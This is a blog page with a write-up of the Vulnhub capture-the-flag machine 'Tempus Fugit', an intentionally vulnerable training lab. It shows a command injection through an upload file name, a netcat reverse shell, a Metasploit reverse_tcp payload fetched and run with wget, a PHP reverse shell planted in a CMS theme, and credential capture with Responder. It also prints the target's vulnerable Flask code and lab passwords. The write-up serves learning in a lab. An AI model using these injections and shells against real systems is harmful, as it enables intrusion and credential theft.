






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="light"
  data-auto-appearance="true"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>Vulnhub - Tempus Fugit &middot; Congo</title>
    <meta name="title" content="Vulnhub - Tempus Fugit &middot; Congo" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
  ></script>
  
  
  
  
  
  
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
  />
  
  
  
  
  
  
  
  <meta
    name="description"
    content="
      
        Writeup for Tempus Fugit by 4ndr34z and DCUA7.
      
    "
  />
  
  
  
  <link rel="canonical" href="//localhost:1313/blog/tempus-fugit/" />
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="//localhost:1313/blog/tempus-fugit/">
  <meta property="og:site_name" content="Congo">
  <meta property="og:title" content="Vulnhub - Tempus Fugit">
  <meta property="og:description" content="Writeup for Tempus Fugit by 4ndr34z and DCUA7.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2019-08-26T00:00:00+00:00">
    <meta property="article:modified_time" content="2019-08-26T00:00:00+00:00">

  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="Vulnhub - Tempus Fugit">
<meta name="twitter:description" content="Writeup for Tempus Fugit by 4ndr34z and DCUA7.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Blogs",
    "name": "Vulnhub - Tempus Fugit",
    "headline": "Vulnhub - Tempus Fugit",
    
    "abstract": "Writeup for Tempus Fugit by 4ndr34z and DCUA7.",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/blog\/tempus-fugit\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2019",
    "dateCreated": "2019-08-26T00:00:00\u002b00:00",
    "datePublished": "2019-08-26T00:00:00\u002b00:00",
    
    "dateModified": "2019-08-26T00:00:00\u002b00:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "1415"
  }
  </script>


  
  
  
  
  






  
  

  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >Congo</a
  >

    </div>
    
    
      <ul class="flex list-none flex-col text-end sm:flex-row">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href=""
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/categories/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Categories</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/tags/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                
                
              
            </li>
          
            
              
          
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Vulnhub - Tempus Fugit
      </h1>
      
        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
          





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2019-08-26 00:00:00 &#43;0000 UTC">26 August 2019</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
    

    
    
  </div>

  
  


        </div>
      
      
    </header>
    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
      
      <div class="min-h-0 min-w-0 max-w-prose grow">
        <p>Writeup for <a href="https://www.vulnhub.com/entry/tempus-fugit-1,346/" target="_blank" rel="noreferrer">Tempus Fugit</a> by <a href="https://twitter.com/4ndr34z" target="_blank" rel="noreferrer">4ndr34z</a> and <a href="https://twitter.com/DCAU7" target="_blank" rel="noreferrer">DCUA7</a>.</p>
<!-- more -->
<h1 id="foreword" class="relative group">Foreword <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#foreword" aria-label="Anchor">#</a></span></h1><p>This machine had a internal network/machine that was our real target and it teaches you about how reconnaisance can often lead you to the vulnerable machine in a network.</p>
<h1 id="nmap" class="relative group">Nmap <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#nmap" aria-label="Anchor">#</a></span></h1><p>Starting off with nmap, scanning with <code>nmap -sV -sC -A -p- 192.168.43.224</code> which shows that we have only one port open i.e. 80 aka HTTP. So, let&rsquo;s check it.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/nmap.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h1 id="http-enumeration" class="relative group">HTTP Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#http-enumeration" aria-label="Anchor">#</a></span></h1><p>Going to the HTTP port gives a good looking UI having a upload feature which will be saved to their internal FTP network of the machine. Now, let&rsquo;s try to upload something which might lead us to something nasty. But as a <strong>sanity check</strong> I tried to upload <code>.php</code> file but it only accepts <code>rtf</code> and <code>txt</code> files, since it wasn&rsquo;t a windows machine any kind of <code>rtf</code> related exploit would be pointless.
Next I tried to intercept the traffic via Burp Suite, now as we can see the contents which was being rendered and the file name field, so as a <strong>sanity check</strong> again, I added <code>file.txt;ls</code> to check it&rsquo;s listing the files from that folder or not, at this point <a href="https://twitter.com/DCAU7" target="_blank" rel="noreferrer">DCAU7</a> helped me. So, it was possible to do a command injection from the file field parameter, the command <code>nc &lt; hexencodedIP port -e sh&gt;</code> pointed out by the <a href="https://twitter.com/DCAU7" target="_blank" rel="noreferrer">DCAU7</a>, probably WAF was preventing the standdard IP from being executed in the same order it was supposed to.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/burp.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Starting the listener and executing that payload of ours, landed a reverse shell.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/tempus.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h1 id="first-network-and-ftp-enumeration" class="relative group">First Network and FTP Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#first-network-and-ftp-enumeration" aria-label="Anchor">#</a></span></h1><p>The real fun started from here. We gained the shell as the root user on the alpine linux.</p>
<p>Yup, we are done. Successfully pwned Tempus Fugit, pretty easy, right? Hold your horses, let&rsquo;s see what flag got for us, going to the <code>/root</code> folder which has a file named <code>message.txt</code> which say</p>
<p>






  
  
<figure><img src="/img/TempusFugit/first.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<blockquote>
<p>You&rsquo;re not done yet! :-)</p>
</blockquote>
<p>So, we are not done, knew something was fishy. So, let&rsquo;s enumerate the system. On the folder where our reverse shell landed us, it had a <code>main.py</code> which had following contents:-</p>
<p>






  
  
<figure><img src="/img/TempusFugit/cmscreds.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Remember when we were told that it has a internal FTP server which was storing our uploaded files, from which I knew that we have to gain access to that FTP server, using <code>nsftp</code> which was the FTP package of Alpine, so using that the crdentials from the following script script</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.request</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ftplib</span> <span class="kn">import</span> <span class="n">FTP</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">UPLOAD_FOLDER</span> <span class="o">=</span> <span class="s1">&#39;upload&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">ALLOWED_EXTENSIONS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rtf&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s2">&#34;mofosecret&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;MAX_CONTENT_LENGTH&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">defaults</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&lt;path:path&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">catch_all</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">      <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;fortune -o&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="s2">&#34;&lt;h1&gt;400 - Sorry. I didn&#39;t find what you where looking for.&lt;/h1&gt; &lt;h2&gt;Maybe this will cheer you up:&lt;/h2&gt;&lt;h3&gt;&#34;</span><span class="o">+</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&lt;/h3&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">internal_error</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&lt;h1&gt;500?! - What are you trying to do here?!&lt;/h1&gt;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_form</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;my-form.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;500.html&#34;</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">allowed_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">           <span class="n">check</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">           <span class="n">check</span> <span class="o">=</span> <span class="n">check</span><span class="p">[:</span><span class="mi">3</span><span class="p">]</span> <span class="ow">in</span> <span class="n">ALLOWED_EXTENSIONS</span>    
</span></span><span class="line"><span class="cl">           <span class="k">return</span> <span class="n">check</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="s1">&#39;file&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">flash</span><span class="p">(</span><span class="s1">&#39;No file part&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">flash</span><span class="p">(</span><span class="s1">&#39;No file selected for uploading&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span> <span class="ow">and</span> <span class="n">allowed_file</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">			<span class="n">filename</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="n">file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">filename</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="n">cmd</span><span class="o">=</span><span class="s2">&#34;cat &#34;</span><span class="o">+</span><span class="n">UPLOAD_FOLDER</span><span class="o">+</span><span class="s2">&#34;/&#34;</span><span class="o">+</span><span class="n">filename</span>
</span></span><span class="line"><span class="cl">			<span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="n">flash</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="n">flash</span><span class="p">(</span><span class="s1">&#39;File successfully uploaded&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			
</span></span><span class="line"><span class="cl">			<span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			   <span class="n">ftp</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">(</span><span class="s1">&#39;ftp.mofo.pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			   <span class="n">ftp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s1">&#39;someuser&#39;</span><span class="p">,</span> <span class="s1">&#39;b232a4da4c104798be4613ab76d26efda1a04606&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			   <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="o">+</span><span class="s2">&#34;/&#34;</span><span class="o">+</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			      <span class="n">ftp</span><span class="o">.</span><span class="n">storlines</span><span class="p">(</span><span class="s1">&#39;STOR </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">filename</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			      <span class="n">ftp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">			<span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			   <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;Cannot connect to FTP-server&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Allowed file types are txt and rtf&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span></span></code></pre></div><p>Using the credentials we logged into the FTP server, and retrieved a file named <code>cmscreds.txt</code> which had crdentials for a Content Management Service, at this point I was so clueless since the directory traversal or forced directory search wasn&rsquo;t working with gobuster, uniscan and others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.4# cat cmscreds.txt
</span></span><span class="line"><span class="cl">cat cmscreds.txt
</span></span><span class="line"><span class="cl">Admin-password <span class="k">for</span> our new CMS
</span></span><span class="line"><span class="cl">hardEnough4u
</span></span></code></pre></div><p>I asked for some nudges from <a href="https://twitter.com/0xmzfr" target="_blank" rel="noreferrer">mzfr</a> and <a href="https://twitter.com/DCUA7" target="_blank" rel="noreferrer">DCUA</a>, both of them told me about the internal network the machine has, having one of them as a target which we wanted to attack. Now, I checked the <code>/root</code> folder which has some files and other stuff and one of the files has some logs having a IP address <code>172.19.0.12</code> which could be the network we want to attack.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/logs.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>But again I&rsquo;m clueless, so I asked <a href="https://twitter.com/4ndr34z" target="_blank" rel="noreferrer">4ndr34z</a> who told me to check <code>/etc/resolv.conf</code> which had an entry for <code>mofo.pwn</code> which has to be enumertaed. I ran <code>dig mofo.pwn axfr</code> which showed me an interesting subdomain named <code>ourcms.mofo.pwn</code> on IP <code>172.19.0.1</code> which was my best bet of that time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash-4.4# apk fetch nmap
</span></span><span class="line"><span class="cl">apk fetch nmap
</span></span><span class="line"><span class="cl">Downloading nmap-7.60-r2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">apk fetch nmap
</span></span><span class="line"><span class="cl">bash-4.4# apk add nmap-7.60-r2.apk
</span></span><span class="line"><span class="cl">apk add nmap-7.60-r2.apk
</span></span><span class="line"><span class="cl"><span class="o">(</span>1/1<span class="o">)</span> Installing nmap <span class="o">(</span>7.60-r2<span class="o">)</span>
</span></span><span class="line"><span class="cl">Executing busybox-1.27.2-r11.trigger
</span></span><span class="line"><span class="cl">OK: <span class="m">160</span> MiB in <span class="m">81</span> packages
</span></span></code></pre></div><blockquote>
<p>Warning: The dig package was not installed on the machine, use <code>apk add bind-tools</code> to get the dig package.</p>
</blockquote>
<h1 id="stable-shell-and-port-forwarding" class="relative group">Stable Shell and Port Forwarding <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#stable-shell-and-port-forwarding" aria-label="Anchor">#</a></span></h1><p>As <a href="https://twitter.com/0xmzfr" target="_blank" rel="noreferrer">mzfr</a> told me that I might needed a stable shell to progress more, I used the metasploit&rsquo;s meterpreter shell in order to get the stable shell. For that, I first created a <code>shell.elf</code> with metasploit so we will create a callback from the shell to the meterpreter shell.
I used a <code>linux/x86/reverse_tcp</code> in order to create a shell.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/shellelf.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, let&rsquo;s get connect to the meterpreter shell:-</p>
<ul>
<li>First we need to configure to the reverse shell payload to <code>linux/x86/reverse_tcp</code> and set the required options i.e. LHOST and LPORT to their values.</li>
</ul>
<p>






  
  
<figure><img src="/img/TempusFugit/metapayload.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<ul>
<li>Then we need to transfer that <code>shell.elf</code> we have created earlier via HTTP port, use <code>python -m SimpleHTTPServer 1337</code> in the directory where <code>shell.elf</code> is.</li>
</ul>
<p>






  
  
<figure><img src="/img/TempusFugit/localhttp.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<ul>
<li>Now, once you get the <code>shell.elf</code> via wget, execute it but beforehand kill the nginx server from running processes via <code>kill &lt; pid &gt;</code> so that port fowarding could be done.</li>
</ul>
<p>






  
  
<figure><img src="/img/TempusFugit/revshellexec.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<ul>
<li>Now, <code>run</code> the metasploit multi handler exploit to connect back to reverse shell.</li>
</ul>
<p>






  
  
<figure><img src="/img/TempusFugit/meterpretershell.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Once, connected it&rsquo;s time to use the metasploit&rsquo;s <code>portfwd</code> utility to forward the services running on <code>ourcms.mofo.pwn</code> to the other port of our hosts.
Run <code>portfwd add -l 8080 -p 8080 -r 172.19.0.1</code> since, <code>ourcms.mofo.pwn</code> resides to the IP <code>172.19.0.1</code>, it&rsquo;ll bound the services to the host and service at port 8080.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/portfwd.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<blockquote>
<p>Warning: Edit the <code>/etc/hosts</code> and add <code>ourcms.mofo.pwn</code> to the localhost, use <code>http://ourcms.mofo.pwn:port</code> to access the services.</p>
</blockquote>
<h5 id="error-port-is-in-use" class="relative group">Error: Port is in use <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#error-port-is-in-use" aria-label="Anchor">#</a></span></h5><p>This might be a troubesome if you did the previous steps and messed up a little like I did.
Instead of using 8080 as the port, use any other which will work, though this can be a little tiresome at some point but it&rsquo;ll do the work since we&rsquo;ve just stumbled upon the machine we wanted to attack.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/error.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h1 id="content-managemnt-service-and-reverse-shell" class="relative group">Content Managemnt Service and Reverse Shell <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#content-managemnt-service-and-reverse-shell" aria-label="Anchor">#</a></span></h1><p>Now, we can access the services, let&rsquo;s log into the CMS already, going to the <code>/admin</code> route, we can sccess the admin panel, recalling what we got from the very first FTP server the credentials which was <code>admin:hardEnough4u</code> and we are logged in. As we are the admin, we can edit, create and do whatever we want to do to server. Now, edit the themes with pentestmonkey&rsquo;s PHP reverse shell and enter the content of it in <code>themes</code>, use the URL specified at the top of the editor and stat the listener to connect to the shell.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/phpshell.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Once connected to the shell, I did some basic enumeration but somehow there wasn&rsquo;t any clue to leverage and we had lots of user. With some little help I used the wireshark and the Responder tool to get the password of the another user.
Just start the wireshark and start the responder in the background and continue enumerating your machine. After 5 minutes or so, I saw the responder output and it had the credentials for <code>gerianne</code> and password <code>barbie</code>.</p>
<p>






  
  
<figure><img src="//img/TempusFugit/geeklocalpass.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Using those credentials, I leveraged upto user gerianne.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/gerianne.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>While I was eumerating the machine I found that there was a email in <code>/var/mail</code> for user gerianne. Now, since we have access to it, let&rsquo;s see what it has:</p>
<p>






  
  
<figure><img src="/img/TempusFugit/mail.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>User merry has given us the password via mail, which was <code>merry:9a4lw0r82mj8</code> now we can leverage upto the user merry. Let&rsquo;s get to the root now, probably?</p>
